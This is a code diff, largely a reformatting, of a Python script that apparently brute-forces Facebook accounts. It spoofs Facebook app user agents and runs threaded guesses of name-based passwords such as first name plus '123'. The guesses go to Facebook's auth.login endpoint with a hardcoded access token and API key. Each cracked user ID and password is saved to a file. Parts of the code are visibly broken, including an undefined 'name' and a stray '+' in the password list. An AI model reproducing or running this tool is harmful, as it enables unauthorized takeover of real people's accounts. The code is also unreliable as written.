@@ -13,60 +13,630 @@ except ModuleNotFoundError:
 
 # UA RANDOMIZER
 gxdsUA1 = []
-gxdsUA2=[]
+gxdsUA2 = []
 gxdsUA3 = []
-gxdsUA4=[]
+gxdsUA4 = []
 
 for i in range(1):
-    fbs = random.choice([
-        'com.facebook.adsmanager',
-        'com.facebook.lite',
-        'com.facebook.orca',
-        'com.facebook.katana',
-        'com.facebook.mlite'])
-    application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
-    application_version_code = str(random.randint(000000000,999999999))
-    android_version = str(random.randrange(5,15))
-    dens = str(random.randrange(0,5))
-    xzx = random.choice(['Samsung', 'Galaxy A7(2016)', 'a7xltechn', 'SM-A710XZ', 'Absolute', 'GT-B9120', 'GT-B9120', 'Acclaim', 'SCH-R880', 'SCH-R880', 'Admire', 'SCH-R720', 'SCH-R720', 'Amazing', 'amazingtrf', 'SGH-S730M', 'Baffin', 'baffinltelgt', 'SHV-E270L', 'Captivate Glide', 'SGH-I927 Samsung-SGH-I927', 'Captivate Glide', 'SGH-I927', 'SGH-I927', 'China Telecom', 'kylevectc', 'SCH-I699I', 'Chromebook Plus', 'kevin_cheets', 'kevin', 'Chromebook Plus', 'kevin_cheets Samsung Chromebook Plus', 'Chromebook Pro', 'caroline_cheets', 'caroline', 'Chromebook Pro', 'caroline_cheets Samsung Chromebook Pro', 'Conquer', 'SPH-D600', 'SPH-D600', 'DoubleTime', 'SGH-I857 Samsung-SGH-I857', 'Droid Charge', 'SCH-I510', 'SCH-I510', 'Elite', 'eliteltechn', 'SM-G1600', 'Elite', 'elitexltechn', 'SM-G1650', 'Europa', 'GT-I5500B', 'GT-I5500B', 'Europa', 'GT-I5500L', 'GT-I5500L', 'Europa', 'GT-I5500M', 'GT-I5500M', 'Europa', 'GT-I5503T', 'GT-I5503T', 'Europa', 'GT-I5510L', 'GT-I5510L', 'Exhibit', 'SGH-T759', 'SGH-T759', 'Galaxy (China)', 'GT-B9062', 'GT-B9062', 'Galaxy 070', 'hendrix', 'YP-GI2', 'Galaxy A', 'archer', 'archer', 'Galaxy A', 'archer', 'SHW-M100S', 'Galaxy A3 (2017)', 'a3y17lte', 'SM-A320Y', 'Galaxy A3', 'a33g', 'SM-A300H', 'Galaxy A3', 'a3lte', 'SM-A300F', 'Galaxy A3', 'a3lte', 'SM-A300M', 'Galaxy A3', 'a3lte', 'SM-A300XZ', 'Galaxy A3', 'a3lte', 'SM-A300YZ', 'Galaxy A3', 'a3ltechn', 'SM-A3000', 'Galaxy A3', 'a3ltechn', 'SM-A300X', 'Galaxy A3', 'a3ltectc', 'SM-A3009', 'Galaxy A3', 'a3ltedd', 'SM-A300G', 'Galaxy A3', 'a3lteslk', 'SM-A300F', 'Galaxy A3', 'a3ltezh', 'SM-A3000', 'Galaxy A3', 'a3ltezt', 'SM-A300YZ', 'Galaxy A3', 'a3ulte', 'SM-A300FU', 'Galaxy A3', 'a3ulte', 'SM-A300XU', 'Galaxy A3', 'a3ulte', 'SM-A300Y', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310F', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310M', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310X', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310Y', 'Galaxy A3(2016)', 'a3xeltekx', 'SM-A310N0', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320F', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320FL', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320X', 'Galaxy A5', 'a53g', 'SM-A500H', 'Galaxy A5', 'a5lte', 'SM-A500F', 'Galaxy A5', 'a5lte', 'SM-A500G', 'Galaxy A5', 'a5lte', 'SM-A500M', 'Galaxy A5', 'a5lte', 'SM-A500XZ', 'Galaxy A5', 'a5ltechn', 'SM-A5000', 'Galaxy A5', 'a5ltechn', 'SM-A500X', 'Galaxy A5', 'a5ltectc', 'SM-A5009', 'Galaxy A5', 'a5ltezh', 'SM-A5000', 'Galaxy A5', 'a5ltezt', 'SM-A500YZ', 'Galaxy A5', 'a5ulte', 'SM-A500FU', 'Galaxy A5', 'a5ulte', 'SM-A500Y', 'Galaxy A5', 'a5ultebmc', 'SM-A500W', 'Galaxy A5', 'a5ultektt', 'SM-A500K', 'Galaxy A5', 'a5ultelgt', 'SM-A500L', 'Galaxy A5', 'a5ulteskt', 'SM-A500F1', 'Galaxy A5', 'a5ulteskt', 'SM-A500S', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510F', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510M', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510X', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xeltecmcc', 'SM-A5108', 'Galaxy A5(2016)', 'a5xeltektt', 'SM-A510K', 'Galaxy A5(2016)', 'a5xeltelgt', 'SM-A510L', 'Galaxy A5(2016)', 'a5xelteskt', 'SM-A510S', 'Galaxy A5(2016)', 'a5xeltextc', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A5100', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A5100X', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A510XZ', 'Galaxy A5(2017)', 'a5y17lte', 'SM-A520F', 'Galaxy A5(2017)', 'a5y17lte', 'SM-A520X', 'Galaxy A5(2017)', 'a5y17ltecan', 'SM-A520W', 'Galaxy A5(2017)', 'a5y17ltektt', 'SM-A520K', 'Galaxy A5(2017)', 'a5y17ltelgt', 'SM-A520L', 'Galaxy A5(2017)', 'a5y17lteskt', 'SM-A520S', 'Galaxy A5x(2016)', 'a5xeltextc', 'SM-A510Y', 'Galaxy A7', 'a73g', 'SM-A700H', 'Galaxy A7', 'a7alte', 'SM-A700F', 'Galaxy A7', 'a7lte', 'SM-A700FD', 'Galaxy A7', 'a7lte', 'SM-A700X', 'Galaxy A7', 'a7ltechn', 'SM-A7000', 'Galaxy A7', 'a7ltechn', 'SM-A700YD', 'Galaxy A7', 'a7ltectc', 'SM-A7009', 'Galaxy A7', 'a7ltektt', 'SM-A700K', 'Galaxy A7', 'a7ltelgt', 'SM-A700L', 'Galaxy A7', 'a7lteskt', 'SM-A700S', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710F', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710M', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710X', 'Galaxy A7(2016)', 'a7xeltecmcc', 'SM-A7108', 'Galaxy A7(2016)', 'a7xeltektt', 'SM-A710K', 'Galaxy A7(2016)', 'a7xeltelgt', 'SM-A710L', 'Galaxy A7(2016)', 'a7xelteskt', 'SM-A710S', 'Galaxy A7(2016)', 'a7xeltextc', 'SM-A710Y', 'Galaxy A7(2016)', 'a7xltechn', 'SM-A7100', 'Galaxy A7(2017)', 'a7y17lte', 'SM-A720F', 'Galaxy A7(2017)', 'a7y17lteskt', 'SM-A720S', 'Galaxy A8', 'a8elte', 'SM-A800F', 'Galaxy A8', 'a8elte', 'SM-A800YZ', 'Galaxy A8', 'a8elteskt', 'SM-A800S', 'Galaxy A8', 'a8hplte', 'SM-A800I', 'Galaxy A8', 'a8hplte', 'SM-A800IZ', 'Galaxy A8', 'a8ltechn', 'SM-A8000', 'Galaxy A8', 'a8ltechn', 'SM-A800X', 'Galaxy A8', 'SCV32', 'SCV32', 'Galaxy A8(2016)', 'a8xelte', 'SM-A810F', 'Galaxy A8(2016)', 'a8xelte', 'SM-A810YZ', 'Galaxy A8(2016)', 'a8xelteskt', 'SM-A810S', 'Galaxy A9 Pro', 'a9xproltechn', 'SM-A9100', 'Galaxy A9 Pro', 'a9xproltesea', 'SM-A910F', 'Galaxy A9(2016)', 'a9xltechn', 'SM-A9000', 'Galaxy Ace 4 Lite', 'vivalto3g', 'SM-G313U', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313HU', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313HY', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313M', 'Galaxy Ace 4', 'vivaltods5m',])
+    fbs = random.choice(
+        [
+            "com.facebook.adsmanager",
+            "com.facebook.lite",
+            "com.facebook.orca",
+            "com.facebook.katana",
+            "com.facebook.mlite",
+        ]
+    )
+    application_version = (
+        str(random.randint(111, 555))
+        + ".0.0."
+        + str(random.randrange(9, 49))
+        + str(random.randint(111, 555))
+    )
+    application_version_code = str(random.randint(000000000, 999999999))
+    android_version = str(random.randrange(5, 15))
+    dens = str(random.randrange(0, 5))
+    xzx = random.choice(
+        [
+            "Samsung",
+            "Galaxy A7(2016)",
+            "a7xltechn",
+            "SM-A710XZ",
+            "Absolute",
+            "GT-B9120",
+            "GT-B9120",
+            "Acclaim",
+            "SCH-R880",
+            "SCH-R880",
+            "Admire",
+            "SCH-R720",
+            "SCH-R720",
+            "Amazing",
+            "amazingtrf",
+            "SGH-S730M",
+            "Baffin",
+            "baffinltelgt",
+            "SHV-E270L",
+            "Captivate Glide",
+            "SGH-I927 Samsung-SGH-I927",
+            "Captivate Glide",
+            "SGH-I927",
+            "SGH-I927",
+            "China Telecom",
+            "kylevectc",
+            "SCH-I699I",
+            "Chromebook Plus",
+            "kevin_cheets",
+            "kevin",
+            "Chromebook Plus",
+            "kevin_cheets Samsung Chromebook Plus",
+            "Chromebook Pro",
+            "caroline_cheets",
+            "caroline",
+            "Chromebook Pro",
+            "caroline_cheets Samsung Chromebook Pro",
+            "Conquer",
+            "SPH-D600",
+            "SPH-D600",
+            "DoubleTime",
+            "SGH-I857 Samsung-SGH-I857",
+            "Droid Charge",
+            "SCH-I510",
+            "SCH-I510",
+            "Elite",
+            "eliteltechn",
+            "SM-G1600",
+            "Elite",
+            "elitexltechn",
+            "SM-G1650",
+            "Europa",
+            "GT-I5500B",
+            "GT-I5500B",
+            "Europa",
+            "GT-I5500L",
+            "GT-I5500L",
+            "Europa",
+            "GT-I5500M",
+            "GT-I5500M",
+            "Europa",
+            "GT-I5503T",
+            "GT-I5503T",
+            "Europa",
+            "GT-I5510L",
+            "GT-I5510L",
+            "Exhibit",
+            "SGH-T759",
+            "SGH-T759",
+            "Galaxy (China)",
+            "GT-B9062",
+            "GT-B9062",
+            "Galaxy 070",
+            "hendrix",
+            "YP-GI2",
+            "Galaxy A",
+            "archer",
+            "archer",
+            "Galaxy A",
+            "archer",
+            "SHW-M100S",
+            "Galaxy A3 (2017)",
+            "a3y17lte",
+            "SM-A320Y",
+            "Galaxy A3",
+            "a33g",
+            "SM-A300H",
+            "Galaxy A3",
+            "a3lte",
+            "SM-A300F",
+            "Galaxy A3",
+            "a3lte",
+            "SM-A300M",
+            "Galaxy A3",
+            "a3lte",
+            "SM-A300XZ",
+            "Galaxy A3",
+            "a3lte",
+            "SM-A300YZ",
+            "Galaxy A3",
+            "a3ltechn",
+            "SM-A3000",
+            "Galaxy A3",
+            "a3ltechn",
+            "SM-A300X",
+            "Galaxy A3",
+            "a3ltectc",
+            "SM-A3009",
+            "Galaxy A3",
+            "a3ltedd",
+            "SM-A300G",
+            "Galaxy A3",
+            "a3lteslk",
+            "SM-A300F",
+            "Galaxy A3",
+            "a3ltezh",
+            "SM-A3000",
+            "Galaxy A3",
+            "a3ltezt",
+            "SM-A300YZ",
+            "Galaxy A3",
+            "a3ulte",
+            "SM-A300FU",
+            "Galaxy A3",
+            "a3ulte",
+            "SM-A300XU",
+            "Galaxy A3",
+            "a3ulte",
+            "SM-A300Y",
+            "Galaxy A3(2016)",
+            "a3xelte",
+            "SM-A310F",
+            "Galaxy A3(2016)",
+            "a3xelte",
+            "SM-A310M",
+            "Galaxy A3(2016)",
+            "a3xelte",
+            "SM-A310X",
+            "Galaxy A3(2016)",
+            "a3xelte",
+            "SM-A310Y",
+            "Galaxy A3(2016)",
+            "a3xeltekx",
+            "SM-A310N0",
+            "Galaxy A3(2017)",
+            "a3y17lte",
+            "SM-A320F",
+            "Galaxy A3(2017)",
+            "a3y17lte",
+            "SM-A320FL",
+            "Galaxy A3(2017)",
+            "a3y17lte",
+            "SM-A320X",
+            "Galaxy A5",
+            "a53g",
+            "SM-A500H",
+            "Galaxy A5",
+            "a5lte",
+            "SM-A500F",
+            "Galaxy A5",
+            "a5lte",
+            "SM-A500G",
+            "Galaxy A5",
+            "a5lte",
+            "SM-A500M",
+            "Galaxy A5",
+            "a5lte",
+            "SM-A500XZ",
+            "Galaxy A5",
+            "a5ltechn",
+            "SM-A5000",
+            "Galaxy A5",
+            "a5ltechn",
+            "SM-A500X",
+            "Galaxy A5",
+            "a5ltectc",
+            "SM-A5009",
+            "Galaxy A5",
+            "a5ltezh",
+            "SM-A5000",
+            "Galaxy A5",
+            "a5ltezt",
+            "SM-A500YZ",
+            "Galaxy A5",
+            "a5ulte",
+            "SM-A500FU",
+            "Galaxy A5",
+            "a5ulte",
+            "SM-A500Y",
+            "Galaxy A5",
+            "a5ultebmc",
+            "SM-A500W",
+            "Galaxy A5",
+            "a5ultektt",
+            "SM-A500K",
+            "Galaxy A5",
+            "a5ultelgt",
+            "SM-A500L",
+            "Galaxy A5",
+            "a5ulteskt",
+            "SM-A500F1",
+            "Galaxy A5",
+            "a5ulteskt",
+            "SM-A500S",
+            "Galaxy A5(2016)",
+            "a5xelte",
+            "SM-A510F",
+            "Galaxy A5(2016)",
+            "a5xelte",
+            "SM-A510M",
+            "Galaxy A5(2016)",
+            "a5xelte",
+            "SM-A510X",
+            "Galaxy A5(2016)",
+            "a5xelte",
+            "SM-A510Y",
+            "Galaxy A5(2016)",
+            "a5xeltecmcc",
+            "SM-A5108",
+            "Galaxy A5(2016)",
+            "a5xeltektt",
+            "SM-A510K",
+            "Galaxy A5(2016)",
+            "a5xeltelgt",
+            "SM-A510L",
+            "Galaxy A5(2016)",
+            "a5xelteskt",
+            "SM-A510S",
+            "Galaxy A5(2016)",
+            "a5xeltextc",
+            "SM-A510Y",
+            "Galaxy A5(2016)",
+            "a5xltechn",
+            "SM-A5100",
+            "Galaxy A5(2016)",
+            "a5xltechn",
+            "SM-A5100X",
+            "Galaxy A5(2016)",
+            "a5xltechn",
+            "SM-A510XZ",
+            "Galaxy A5(2017)",
+            "a5y17lte",
+            "SM-A520F",
+            "Galaxy A5(2017)",
+            "a5y17lte",
+            "SM-A520X",
+            "Galaxy A5(2017)",
+            "a5y17ltecan",
+            "SM-A520W",
+            "Galaxy A5(2017)",
+            "a5y17ltektt",
+            "SM-A520K",
+            "Galaxy A5(2017)",
+            "a5y17ltelgt",
+            "SM-A520L",
+            "Galaxy A5(2017)",
+            "a5y17lteskt",
+            "SM-A520S",
+            "Galaxy A5x(2016)",
+            "a5xeltextc",
+            "SM-A510Y",
+            "Galaxy A7",
+            "a73g",
+            "SM-A700H",
+            "Galaxy A7",
+            "a7alte",
+            "SM-A700F",
+            "Galaxy A7",
+            "a7lte",
+            "SM-A700FD",
+            "Galaxy A7",
+            "a7lte",
+            "SM-A700X",
+            "Galaxy A7",
+            "a7ltechn",
+            "SM-A7000",
+            "Galaxy A7",
+            "a7ltechn",
+            "SM-A700YD",
+            "Galaxy A7",
+            "a7ltectc",
+            "SM-A7009",
+            "Galaxy A7",
+            "a7ltektt",
+            "SM-A700K",
+            "Galaxy A7",
+            "a7ltelgt",
+            "SM-A700L",
+            "Galaxy A7",
+            "a7lteskt",
+            "SM-A700S",
+            "Galaxy A7(2016)",
+            "a7xelte",
+            "SM-A710F",
+            "Galaxy A7(2016)",
+            "a7xelte",
+            "SM-A710M",
+            "Galaxy A7(2016)",
+            "a7xelte",
+            "SM-A710X",
+            "Galaxy A7(2016)",
+            "a7xeltecmcc",
+            "SM-A7108",
+            "Galaxy A7(2016)",
+            "a7xeltektt",
+            "SM-A710K",
+            "Galaxy A7(2016)",
+            "a7xeltelgt",
+            "SM-A710L",
+            "Galaxy A7(2016)",
+            "a7xelteskt",
+            "SM-A710S",
+            "Galaxy A7(2016)",
+            "a7xeltextc",
+            "SM-A710Y",
+            "Galaxy A7(2016)",
+            "a7xltechn",
+            "SM-A7100",
+            "Galaxy A7(2017)",
+            "a7y17lte",
+            "SM-A720F",
+            "Galaxy A7(2017)",
+            "a7y17lteskt",
+            "SM-A720S",
+            "Galaxy A8",
+            "a8elte",
+            "SM-A800F",
+            "Galaxy A8",
+            "a8elte",
+            "SM-A800YZ",
+            "Galaxy A8",
+            "a8elteskt",
+            "SM-A800S",
+            "Galaxy A8",
+            "a8hplte",
+            "SM-A800I",
+            "Galaxy A8",
+            "a8hplte",
+            "SM-A800IZ",
+            "Galaxy A8",
+            "a8ltechn",
+            "SM-A8000",
+            "Galaxy A8",
+            "a8ltechn",
+            "SM-A800X",
+            "Galaxy A8",
+            "SCV32",
+            "SCV32",
+            "Galaxy A8(2016)",
+            "a8xelte",
+            "SM-A810F",
+            "Galaxy A8(2016)",
+            "a8xelte",
+            "SM-A810YZ",
+            "Galaxy A8(2016)",
+            "a8xelteskt",
+            "SM-A810S",
+            "Galaxy A9 Pro",
+            "a9xproltechn",
+            "SM-A9100",
+            "Galaxy A9 Pro",
+            "a9xproltesea",
+            "SM-A910F",
+            "Galaxy A9(2016)",
+            "a9xltechn",
+            "SM-A9000",
+            "Galaxy Ace 4 Lite",
+            "vivalto3g",
+            "SM-G313U",
+            "Galaxy Ace 4",
+            "vivaltods5m",
+            "SM-G313HU",
+            "Galaxy Ace 4",
+            "vivaltods5m",
+            "SM-G313HY",
+            "Galaxy Ace 4",
+            "vivaltods5m",
+            "SM-G313M",
+            "Galaxy Ace 4",
+            "vivaltods5m",
+        ]
+    )
     try:
-        gxdsUA1.append(f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(xzx[3])} Build/{str(xzx[2])} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density='+dens+'.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBMF/{str(xzx[0])};FBBD/{str(xzx[0])};FBPN/{str(fbs)};FBDV/{str(xzx[3])};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]')
+        gxdsUA1.append(
+            f"Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(xzx[3])} Build/{str(xzx[2])} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/"
+            + "{density="
+            + dens
+            + ".0,width=720,height=1280};"
+            + f"FBLC/en_US;FBRV/{str(application_version_code)};FBMF/{str(xzx[0])};FBBD/{str(xzx[0])};FBPN/{str(fbs)};FBDV/{str(xzx[3])};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+        )
     except IndexError:
         pass
 
 for xd in range(1):
-    aa='Mozilla/5.0 (Linux; U; Android'
-    b=random.choice(['4','5','6','7','8','9','10','11','12'])
-    c=' en-us; GT-'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    xx='Mobile Safari/537.36'
-    paku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {xx}'
+    aa = "Mozilla/5.0 (Linux; U; Android"
+    b = random.choice(["4", "5", "6", "7", "8", "9", "10", "11", "12"])
+    c = " en-us; GT-"
+    d = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    e = random.randrange(1, 999)
+    f = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    g = "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"
+    h = random.randrange(73, 100)
+    i = "0"
+    j = random.randrange(4200, 4900)
+    k = random.randrange(40, 150)
+    xx = "Mobile Safari/537.36"
+    paku2 = f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {xx}"
     gxdsUA3.append(paku2)
-    
-    
-    a='Dalvik/2.1.0 (Linux; U; Android'
-    b=random.randrange(6, 15)
-    c=random.randrange(100, 9999)
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    h=random.randrange(1, 9)
-    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
-    j=random.randrange(1, 9)
-    k=random.randrange(1, 9)
-    xx='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
-    pakuu=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {xx}'
+
+    a = "Dalvik/2.1.0 (Linux; U; Android"
+    b = random.randrange(6, 15)
+    c = random.randrange(100, 9999)
+    d = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    e = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    f = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    g = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    h = random.randrange(1, 9)
+    i = "; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/"
+    j = random.randrange(1, 9)
+    k = random.randrange(1, 9)
+    xx = "Mobile WVGA SMM-MMS/1.2.0 OPN-B"
+    pakuu = f"{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {xx}"
     gxdsUA4.append(pakuu)
-    
-    gxdsUArndm = gxdsUA3+gxdsUA4+gxdsUA1
+
+    gxdsUArndm = gxdsUA3 + gxdsUA4 + gxdsUA1
 
 
 # COLORS
@@ -246,14 +816,15 @@ def gxdsfiles(gxdsfiles1):
     # PASSWORD LIST
     with ThreadPool(max_workers=30) as GOXDIES:
         for data in gxdsfiles1:
-          fs = name.split(' ')[0]
+            fs = name.split(" ")[0]
             try:
-                ls = name.split(' ')[1]
+                ls = name.split(" ")[1]
             except:
                 ls = fs
             uid = data.split("|")[0]
-            pwx = [fs+"123",+fs+"143"]
+            pwx = [fs + "123", +fs + "143"]
             GOXDIES.submit(gxds_files, uid, pwx)
+
 
 # LOOP MENU
 loop = 0
@@ -271,28 +842,28 @@ def gxds_files(uid, pwx):
     try:
         for ps in pwx:
             data = {
-                    "adid": str(uuid.uuid4()),
-                    "format": "json",
-                    "device_id": str(uuid.uuid4()),
-                    "cpl": "true",
-                    "family_device_id": str(uuid.uuid4()),
-                    "credentials_type": "device_based_login_password",
-                    "error_detail_type": "button_with_disabled",
-                    "source": "device_based_login",
-                    "email": uid,
-                    "password": ps,
-                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
-                    "generate_session_cookies": "1",
-                    "meta_inf_fbmeta": "",
-                    "advertiser_id": str(uuid.uuid4()),
-                    "currently_logged_in_userid": "0",
-                    "locale": "en_GB",
-                    "client_country_code": "GB",
-                    "method": "auth.login",
-                    "fb_api_req_friendly_name": "authenticate",
-                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                    "api_key": "882a8490361da98702bf97a021ddc14d",
-                }
+                "adid": str(uuid.uuid4()),
+                "format": "json",
+                "device_id": str(uuid.uuid4()),
+                "cpl": "true",
+                "family_device_id": str(uuid.uuid4()),
+                "credentials_type": "device_based_login_password",
+                "error_detail_type": "button_with_disabled",
+                "source": "device_based_login",
+                "email": uid,
+                "password": ps,
+                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+                "generate_session_cookies": "1",
+                "meta_inf_fbmeta": "",
+                "advertiser_id": str(uuid.uuid4()),
+                "currently_logged_in_userid": "0",
+                "locale": "en_GB",
+                "client_country_code": "GB",
+                "method": "auth.login",
+                "fb_api_req_friendly_name": "authenticate",
+                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                "api_key": "882a8490361da98702bf97a021ddc14d",
+            }
             headers = {
                 "User-Agent": random.choice(gxdsUArndm),
                 "Content-Type": "application/x-www-form-urlencoded",
@@ -317,9 +888,7 @@ def gxds_files(uid, pwx):
                 allow_redirects=False,
             ).json()
             if "session_key" in q:
-                open("/sdcard/gxds-ok.txt", "a").write(
-                    uid + "|" + ps + "\n"
-                )
+                open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 oks.append(uid)
                 break
             elif "www.facebook.com" in q["error"]["message"]:
